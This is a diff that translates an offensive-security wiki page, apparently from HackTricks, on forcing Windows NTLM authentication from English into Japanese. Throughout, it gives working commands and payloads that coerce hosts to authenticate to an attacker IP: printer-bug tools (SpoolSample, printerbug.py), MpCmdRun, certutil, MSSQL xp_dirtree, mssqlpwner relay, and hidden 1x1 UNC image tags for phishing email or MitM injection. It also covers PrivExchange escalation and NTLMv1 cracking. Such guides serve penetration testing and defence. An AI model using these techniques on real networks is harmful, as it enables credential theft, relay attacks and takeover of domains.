@@ -1,86 +1,71 @@
-# Force NTLM Privileged Authentication
+# NTLM特権認証の強制
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、3rd party依存関係を避けるためにMIDLコンパイラを使用してC#でコーディングされた**リモート認証トリガー**の**コレクション**です。
 
-## Spooler Service Abuse
+## スプーラーサービスの悪用
 
-If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
-Note when printer send the notification to an arbitrary systems, it needs to **authenticate against** that **system**. Therefore, an attacker can make the _**Print Spooler**_ service authenticate against an arbitrary system, and the service will **use the computer account** in this authentication.
+_**Print Spooler**_ サービスが**有効**な場合、既知のAD資格情報を使用してドメインコントローラーの印刷サーバーに新しい印刷ジョブの**更新**を**要求**し、**通知を特定のシステムに送信するように指示**できます。\
+プリンターが任意のシステムに通知を送信する際には、その**システム**に対して**認証**を行う必要があります。したがって、攻撃者は_**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、その認証では**コンピューターアカウント**が使用されます。
 
-### Finding Windows Servers on the domain
+### ドメイン上のWindowsサーバーの発見
 
-Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
-
+PowerShellを使用してWindowsボックスのリストを取得します。サーバーは通常優先されるため、そこに焦点を当てましょう：
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
+### スプーラーサービスのリスニングを確認する
 
-### Finding Spooler services listening
-
-Using a slightly modified @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), see if the Spooler Service is listening:
-
+少し修正された@mysmartlogin（Vincent Le Toux）の[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)を使用して、スプーラーサービスがリスニングしているか確認します：
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 ```
-
-You can also use rpcdump.py on Linux and look for the MS-RPRN Protocol
-
+Linux上でrpcdump.pyを使用し、MS-RPRNプロトコルを探すこともできます。
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
+### 任意のホストに対してサービスに認証を要求する
 
-### Ask the service to authenticate against an arbitrary host
-
-You can compile[ **SpoolSample from here**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
-
+[ **ここからSpoolSampleをコンパイルできます**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-
-or use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) or [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) if you're on Linux
-
+または、Linuxを使用している場合は、[**3xocyteのdementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)または[**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)を使用してください。
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
+### Unconstrained Delegationとの組み合わせ
 
-### Combining with Unconstrained Delegation
+攻撃者がすでに[Unconstrained Delegation](unconstrained-delegation.md)でコンピュータを侵害している場合、攻撃者は**プリンタをこのコンピュータに対して認証させる**ことができます。制約のない委任のため、**プリンタのコンピュータアカウントのTGT**は、制約のない委任を持つコンピュータの**メモリ**に**保存されます**。攻撃者がすでにこのホストを侵害しているため、**このチケットを取得し**、それを悪用することができます（[Pass the Ticket](pass-the-ticket.md)）。
 
-If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it ([Pass the Ticket](pass-the-ticket.md)).
-
-## RCP Force authentication
+## RCP強制認証
 
 {% embed url="https://github.com/p0dalirius/Coercer" %}
 
 ## PrivExchange
 
-The `PrivExchange` attack is a result of a flaw found in the **Exchange Server `PushSubscription` feature**. This feature allows the Exchange server to be forced by any domain user with a mailbox to authenticate to any client-provided host over HTTP.
+`PrivExchange`攻撃は、**Exchange Serverの`PushSubscription`機能**に見つかった欠陥の結果です。この機能により、メールボックスを持つ任意のドメインユーザーがHTTP経由で任意のクライアント提供ホストに対してExchangeサーバーを強制的に認証させることができます。
 
-By default, the **Exchange service runs as SYSTEM** and is given excessive privileges (specifically, it has **WriteDacl privileges on the domain pre-2019 Cumulative Update**). This flaw can be exploited to enable the **relaying of information to LDAP and subsequently extract the domain NTDS database**. In cases where relaying to LDAP is not possible, this flaw can still be used to relay and authenticate to other hosts within the domain. The successful exploitation of this attack grants immediate access to the Domain Admin with any authenticated domain user account.
+デフォルトでは、**ExchangeサービスはSYSTEMとして実行され**、過剰な特権が与えられています（具体的には、**2019年以前の累積更新に対するWriteDacl特権を持っています**）。この欠陥は、**情報をLDAPに中継し、その後ドメインNTDSデータベースを抽出する**ために悪用できます。LDAPへの中継が不可能な場合でも、この欠陥はドメイン内の他のホストに中継および認証するために使用できます。この攻撃の成功した悪用は、認証された任意のドメインユーザーアカウントでドメイン管理者への即時アクセスを許可します。
 
-## Inside Windows
+## Windows内部
 
-If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with:
+すでにWindowsマシン内にいる場合、特権アカウントを使用してサーバーに接続するようWindowsを強制することができます。
 
 ### Defender MpCmdRun
-
 ```bash
 C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
 ```
-
 ### MSSQL
-
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
-
 [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
-
 ```shell
 # Issuing NTLM relay attack on the SRV01 server
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
@@ -91,41 +76,33 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-
 # Issuing NTLM relay attack on the local server with custom command
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
-
-Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+または、この別の技術を使用します: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
-It's possible to use certutil.exe lolbin (Microsoft-signed binary) to coerce NTLM authentication:
-
+certutil.exe lolbin（Microsoft署名のバイナリ）を使用してNTLM認証を強制することが可能です:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
+## HTMLインジェクション
 
-## HTML injection
+### メール経由
 
-### Via email
-
-If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as
-
+もしあなたが侵害したいマシンにログインするユーザーの**メールアドレス**を知っているなら、**1x1画像**を含む**メール**を送信することができます。
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-
-and when he opens it, he will try to authenticate.
+そして、彼がそれを開くと、認証を試みるでしょう。
 
 ### MitM
 
-If you can perform a MitM attack to a computer and inject HTML in a page he will visualize you could try injecting an image like the following in the page:
-
+もしあなたがコンピュータに対してMitM攻撃を実行し、彼が視覚化するページにHTMLを注入できるなら、次のような画像をページに注入してみることができます：
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
+## NTLMv1のクラッキング
 
-## Cracking NTLMv1
-
-If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack).\
-&#xNAN;_&#x52;emember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
+[NTLMv1チャレンジをキャプチャできる場合は、ここでそれをクラッキングする方法を読んでください](../ntlm/#ntlmv1-attack)。\
+&#xNAN;_&#x52;emember NTLMv1をクラッキングするには、Responderチャレンジを「1122334455667788」に設定する必要があります_
 
 {{#include ../../banners/hacktricks-training.md}}
-
